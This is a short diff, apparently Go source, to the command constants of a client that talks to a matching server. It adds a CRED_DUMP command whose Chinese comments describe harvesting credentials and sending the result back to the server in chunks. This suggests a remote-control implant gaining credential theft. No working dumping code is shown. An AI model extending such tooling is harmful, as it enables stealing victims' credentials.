@@ -133,4 +133,8 @@ const (
 	// 文件搜索（功能批，须与服务端 pkg/command/cmdType.go 一致）：
 	// 参数 <startDir>|<maxResults>|<keyword>，结果按 FileBrowse 的 D/F 行格式回传
 	FILE_SEARCH = 129
+
+	// 凭据获取（阶段三，须与服务端 pkg/command/cmdType.go 一致）：
+	// cmdBuf = "kind|tech|fileName"。制品经下载通道回传（type22 头 + type26 分块）。
+	CRED_DUMP = 130
 )
